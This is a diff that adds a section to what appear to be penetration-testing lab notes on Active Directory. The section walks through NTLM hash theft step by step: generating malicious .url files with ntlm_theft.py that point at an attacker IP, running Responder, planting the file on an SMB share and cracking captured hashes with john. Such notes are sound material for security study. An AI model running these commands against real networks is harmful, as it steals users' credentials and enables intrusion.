@@ -41,4 +41,43 @@ For example:
     GroupB contains a privileged user, like a Domain Admin.
     The attacker can then leverage control over UserA to modify GroupB and escalate privileges
 
+----------------------------------------------------------------------------------------------------------------------
+
+
+If we know there is activity in the share, we can try dropping a file to the share that will **force the user to authenticate to our server** when a user browses the share.
+
+
+Using ```ntlm_theft.py``` to create a malicious ```.url``` file.
+	
+```
+$ python3 ntlm_theft.py -g url -s 10.11.63.57 -f test
+Created: test/test-(url).url (BROWSE TO FOLDER)
+Created: test/test-(icon).url (BROWSE TO FOLDER)
+Generation Complete.
+```
+Running responder to spin up a server that will respond to the authentication requests made.
+	
+```
+$ sudo responder -I tun0
+```
+Uploading the generated file to the vuln share.
+	
+```
+smb: \> cd onboarding\
+smb: \onboarding\> put "test-(icon).url"
+putting file test-(icon).url as \onboarding\test-(icon).url (0.4 kb/s) (average 0.3 kb/s)
+```
+After some time we get the hash.
+<br>
+Then we could use john to crack the hash.
+```
+john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt  
+```
+
+
+
+
+
+
+
 
